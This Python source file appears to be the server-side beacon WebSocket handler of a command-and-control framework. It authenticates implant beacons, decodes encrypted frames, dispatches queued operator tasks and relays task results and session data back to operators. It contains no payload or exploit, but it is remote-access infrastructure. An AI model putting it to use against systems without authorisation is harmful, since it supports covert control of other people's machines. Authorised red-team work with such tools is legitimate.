from __future__ import annotations

import asyncio
import uuid
from collections.abc import Callable

from fastapi import WebSocket
from sqlalchemy.orm import Session
from xero_common.database import session_factory_for_settings
from xero_common.models import utc_now
from xero_common.redis_bus import publish_operator_event

from xero_c2.beacon_auth import find_authenticated_beacon
from xero_c2.beacon_liveness import publish_beacon_event
from xero_c2.beacon_transport import (
    BEACON_WEBSOCKET_PROTOCOL,
    WS_CLOSE_PROTOCOL_ERROR,
    WS_CLOSE_UNAUTHORIZED,
    BeaconTransportManager,
    ManagedBeaconConnection,
    extract_beacon_websocket_token,
    parse_websocket_subprotocols,
)
from xero_c2.models import Beacon
from xero_c2.protocol import (
    ACK,
    PROTOCOL_ERROR,
    REGISTER,
    SESSION_DATA,
    TASK_POLL,
    DecodedFrame,
    ProtocolError,
    decode_frame,
)
from xero_c2.protocol_processing import (
    c2_protocol_private_key,
    encrypted_protocol_frame,
    ensure_nonce_not_replayed,
    frame_metadata,
    process_protocol_frame,
    protocol_supported_versions,
    record_frame_receipt,
    record_protocol_error,
)
from xero_c2.realtime import close_forbidden, websocket_origin_allowed
from xero_c2.sessions import apply_beacon_session_data, publish_session_payload_event
from xero_c2.task_queue import (
    TaskQueueUnavailable,
    dispatch_next_task,
    public_task,
    task_delivery_payload,
    task_event_type,
)

PublicBeacon = Callable[[Beacon], dict]


async def publish_task_event(app, settings, event_type: str, task_payload: dict) -> None:
    redis_client = getattr(app.state, "redis_client", None)
    event = await publish_operator_event(
        redis_client,
        settings,
        event_type,
        data={"task": task_payload},
        scope={"beacon_id": task_payload["beacon_id"], "task_id": task_payload["id"]},
    )
    if redis_client is None:
        await app.state.operator_realtime_hub.broadcast(event)


async def publish_task_result_event(app, settings, event_type: str, result_payload: dict) -> None:
    redis_client = getattr(app.state, "redis_client", None)
    event = await publish_operator_event(
        redis_client,
        settings,
        event_type,
        data={"task_result": result_payload},
        scope={"beacon_id": result_payload["beacon_id"], "task_id": result_payload["task_id"]},
    )
    if redis_client is None:
        await app.state.operator_realtime_hub.broadcast(event)


async def publish_task_result_chunk_event(app, settings, event_type: str, chunk_payload: dict) -> None:
    redis_client = getattr(app.state, "redis_client", None)
    event = await publish_operator_event(
        redis_client,
        settings,
        event_type,
        data={"task_result_chunk": chunk_payload},
        scope={"beacon_id": chunk_payload["beacon_id"], "task_id": chunk_payload["task_id"]},
    )
    if redis_client is None:
        await app.state.operator_realtime_hub.broadcast(event)


def websocket_protocol_accepted(websocket: WebSocket) -> bool:
    return BEACON_WEBSOCKET_PROTOCOL in parse_websocket_subprotocols(websocket)


async def close_beacon_websocket_unauthorized(websocket: WebSocket) -> None:
    await websocket.close(code=WS_CLOSE_UNAUTHORIZED)


async def receive_beacon_frame(websocket: WebSocket, settings) -> bytes | None:
    message = await websocket.receive()
    if message.get("type") == "websocket.disconnect":
        return None
    if message.get("text") is not None:
        raise ProtocolError("TEXT_FRAME_REJECTED", "Text WebSocket frames are not accepted")
    frame = message.get("bytes")
    if not isinstance(frame, bytes):
        raise ProtocolError("MALFORMED_FRAME", "WebSocket frame did not contain binary data")
    if len(frame) > settings.beacon_ws_max_message_bytes:
        raise ProtocolError("FRAME_TOO_LARGE", "WebSocket frame exceeds configured maximum")
    return frame


def validate_bound_beacon(decoded: DecodedFrame, bound_beacon_id: uuid.UUID | None) -> None:
    if bound_beacon_id is None or decoded.message_type == REGISTER:
        return
    raw_beacon_id = decoded.payload.get("beacon_id")
    if raw_beacon_id != str(bound_beacon_id):
        raise ProtocolError("BEACON_ID_MISMATCH", "Frame beacon_id does not match the authenticated connection")


def update_beacon_transport_state(
    session: Session,
    beacon_id: uuid.UUID,
    *,
    connected: bool,
    mode: str = "websocket",
) -> Beacon | None:
    beacon = session.get(Beacon, beacon_id)
    if beacon is None:
        return None
    beacon.transport_mode = mode
    beacon.transport_connected = connected
    beacon.transport_last_seen = utc_now()
    session.add(beacon)
    return beacon


def beacon_websocket_close_code(exc: ProtocolError) -> int:
    if exc.code == "FRAME_TOO_LARGE":
        return 1009
    return WS_CLOSE_PROTOCOL_ERROR


async def run_beacon_websocket(websocket: WebSocket, *, settings, public_beacon: PublicBeacon) -> None:
    if not websocket_origin_allowed(websocket, settings):
        await close_forbidden(websocket)
        return
    if not websocket_protocol_accepted(websocket):
        await close_beacon_websocket_unauthorized(websocket)
        return

    SessionFactory = session_factory_for_settings(settings)
    raw_beacon_id = websocket.query_params.get("beacon_id")
    token = extract_beacon_websocket_token(websocket)
    bound_beacon_id: uuid.UUID | None = None
    if raw_beacon_id or token:
        if raw_beacon_id is None:
            await close_beacon_websocket_unauthorized(websocket)
            return
        try:
            requested_beacon_id = uuid.UUID(raw_beacon_id)
        except ValueError:
            await close_beacon_websocket_unauthorized(websocket)
            return
        with SessionFactory() as session:
            beacon = find_authenticated_beacon(session, requested_beacon_id, token)
        if beacon is None:
            await close_beacon_websocket_unauthorized(websocket)
            return
        bound_beacon_id = requested_beacon_id

    await websocket.accept(subprotocol=BEACON_WEBSOCKET_PROTOCOL)
    manager: BeaconTransportManager = websocket.app.state.beacon_transport_manager
    connection: ManagedBeaconConnection | None = None
    if bound_beacon_id is not None:
        connection = await manager.register(websocket, bound_beacon_id)
        with SessionFactory() as session:
            beacon = update_beacon_transport_state(session, bound_beacon_id, connected=True)
            session.commit()
            beacon_payload = public_beacon(beacon) if beacon is not None else None
        if beacon_payload is not None:
            await publish_beacon_event(websocket.app, settings, "beacon.transport.changed", beacon_payload)

    try:
        while True:
            timeout = (
                settings.beacon_ws_heartbeat_timeout_seconds
                if bound_beacon_id is not None
                else settings.beacon_ws_registration_timeout_seconds
            )
            try:
                raw_frame = await asyncio.wait_for(receive_beacon_frame(websocket, settings), timeout=timeout)
            except TimeoutError:
                await websocket.close(code=WS_CLOSE_PROTOCOL_ERROR)
                break
            except ProtocolError as exc:
                with SessionFactory() as session:
                    record_protocol_error(session, exc, None, beacon_id=bound_beacon_id)
                    session.commit()
                await websocket.close(code=beacon_websocket_close_code(exc))
                break

            if raw_frame is None:
                break

            metadata = frame_metadata(raw_frame)
            decoded: DecodedFrame | None = None
            ack_frame: bytes | None = None
            error_frame: bytes | None = None
            close_code: int | None = None
            beacon_payload: dict | None = None
            event_type: str | None = None
            task_events: list[tuple[str, dict]] = []
            task_result_chunk_events: list[tuple[str, dict]] = []
            task_result_events: list[tuple[str, dict]] = []
            session_data_outcome = None
            with SessionFactory() as session:
                try:
                    ensure_nonce_not_replayed(session, metadata)
                    decoded = decode_frame(
                        raw_frame,
                        private_key=c2_protocol_private_key(settings),
                        supported_versions=protocol_supported_versions(settings),
                        max_frame_bytes=min(
                            settings.protocol_max_frame_bytes,
                            settings.beacon_ws_max_message_bytes,
                        ),
                    )
                    if bound_beacon_id is None and decoded.message_type != REGISTER:
                        raise ProtocolError(
                            "AUTHENTICATION_REQUIRED",
                            "First unauthenticated WebSocket frame must be REGISTER",
                        )
                    validate_bound_beacon(decoded, bound_beacon_id)
                    beacon_id, ack_payload = process_protocol_frame(
                        session,
                        settings,
                        decoded,
                        transport_mode="websocket",
                        transport_connected=True,
                    )
                    if decoded.message_type == TASK_POLL and beacon_id is not None:
                        try:
                            task = await dispatch_next_task(
                                session,
                                settings,
                                websocket.app.state.task_queue_service,
                                getattr(websocket.app.state, "redis_client", None),
                                beacon_id=beacon_id,
                            )
                        except TaskQueueUnavailable as exc:
                            raise ProtocolError(
                                "TASK_QUEUE_UNAVAILABLE",
                                "Task queue is unavailable",
                                status_code=503,
                            ) from exc
                        if task is not None:
                            task_payload = public_task(task)
                            ack_payload["task"] = task_delivery_payload(task)
                            task_events.append((task_event_type(task_payload["status"]), task_payload))
                    if decoded.message_type == SESSION_DATA and beacon_id is not None:
                        session_data_outcome = apply_beacon_session_data(
                            session,
                            beacon_id=beacon_id,
                            payload=decoded.payload,
                            settings=settings,
                        )
                    record_frame_receipt(session, decoded, beacon_id=beacon_id)
                    session.commit()

                    if bound_beacon_id is None and beacon_id is not None:
                        bound_beacon_id = beacon_id
                        connection = await manager.register(websocket, bound_beacon_id)
                    if connection is not None:
                        connection.touch()
                    if beacon_id is not None:
                        beacon = session.get(Beacon, beacon_id)
                        if beacon is not None:
                            beacon_payload = public_beacon(beacon)
                    event_type = str(ack_payload.get("event_type", "beacon.heartbeat"))
                    if ack_payload.get("task_event_type") and isinstance(ack_payload.get("task"), dict):
                        task_events.append((str(ack_payload["task_event_type"]), ack_payload["task"]))
                    if ack_payload.get("task_result_chunk_event_type") and isinstance(
                        ack_payload.get("task_result_chunk"), dict
                    ):
                        task_result_chunk_events.append(
                            (str(ack_payload["task_result_chunk_event_type"]), ack_payload["task_result_chunk"])
                        )
                    if ack_payload.get("task_result_event_type") and isinstance(ack_payload.get("task_result"), dict):
                        task_result_events.append(
                            (str(ack_payload["task_result_event_type"]), ack_payload["task_result"])
                        )
                    ack_frame = encrypted_protocol_frame(settings, decoded, ACK, ack_payload)
                except ProtocolError as exc:
                    session.rollback()
                    record_protocol_error(session, exc, metadata, beacon_id=bound_beacon_id)
                    session.commit()
                    close_code = beacon_websocket_close_code(exc)
                    if decoded is not None:
                        error_frame = encrypted_protocol_frame(
                            settings,
                            decoded,
                            PROTOCOL_ERROR,
                            {"status": "error", "code": exc.code, "message": exc.message},
                        )

            if error_frame is not None:
                if connection is not None:
                    await connection.enqueue(error_frame)
                else:
                    await websocket.send_bytes(error_frame)
            if close_code is not None:
                await websocket.close(code=close_code)
                break
            if ack_frame is not None:
                sent = await connection.enqueue(ack_frame) if connection is not None else False
                if not sent:
                    break
            if beacon_payload is not None and decoded is not None:
                if decoded.message_type == REGISTER:
                    await publish_beacon_event(
                        websocket.app,
                        settings,
                        event_type or "beacon.registered",
                        beacon_payload,
                    )
                    await publish_beacon_event(websocket.app, settings, "beacon.transport.changed", beacon_payload)
                elif decoded.message_type == "HEARTBEAT":
                    await publish_beacon_event(websocket.app, settings, "beacon.heartbeat", beacon_payload)
            for task_event_type_value, task_payload in task_events:
                await publish_task_event(websocket.app, settings, task_event_type_value, task_payload)
            for task_result_chunk_event_type_value, task_result_chunk_payload in task_result_chunk_events:
                await publish_task_result_chunk_event(
                    websocket.app,
                    settings,
                    task_result_chunk_event_type_value,
                    task_result_chunk_payload,
                )
            for task_result_event_type_value, task_result_payload in task_result_events:
                await publish_task_result_event(
                    websocket.app,
                    settings,
                    task_result_event_type_value,
                    task_result_payload,
                )
            if session_data_outcome is not None:
                if session_data_outcome.cache_listing is not None:
                    await websocket.app.state.session_file_cache.store(
                        session_data_outcome.session_id,
                        session_data_outcome.cache_listing,
                    )
                if session_data_outcome.operator_message is not None:
                    await websocket.app.state.session_relay_manager.deliver(
                        session_data_outcome.session_id,
                        session_data_outcome.operator_message,
                    )
                if session_data_outcome.event_type is not None:
                    await publish_session_payload_event(
                        websocket.app,
                        settings,
                        session_data_outcome.event_type,
                        session_data_outcome.session_payload,
                    )
    finally:
        if bound_beacon_id is not None and connection is not None:
            removed = await manager.unregister(bound_beacon_id, connection.id)
            if removed:
                with SessionFactory() as session:
                    beacon = update_beacon_transport_state(session, bound_beacon_id, connected=False)
                    session.commit()
                    beacon_payload = public_beacon(beacon) if beacon is not None else None
                if beacon_payload is not None:
                    await publish_beacon_event(websocket.app, settings, "beacon.transport.changed", beacon_payload)
